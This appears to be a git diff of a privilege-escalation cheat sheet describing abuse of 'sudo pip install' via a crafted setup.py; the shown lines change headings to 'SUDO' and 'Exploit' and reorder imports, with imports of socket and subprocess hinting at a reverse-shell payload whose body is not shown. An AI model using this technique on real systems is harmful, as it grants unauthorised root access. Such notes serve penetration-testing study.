@@ -5,14 +5,15 @@ tags: ["pip", "pip3", "python", "sudo", "privesc"]
 ---
 
 ---
-### Privesc
+### SUDO
+
+#### 1. Create a setup.py
 
 ```python
 #!/usr/bin/env python3
 
-from setuptools import setup
 from setuptools.command.install import install
-
+from setuptools import setup
 import os
 import socket
 import subprocess
@@ -33,7 +34,7 @@ setup(
 )
 ```
 
-<br>
+#### 2. Exploit
 
 ```bash
 # Run
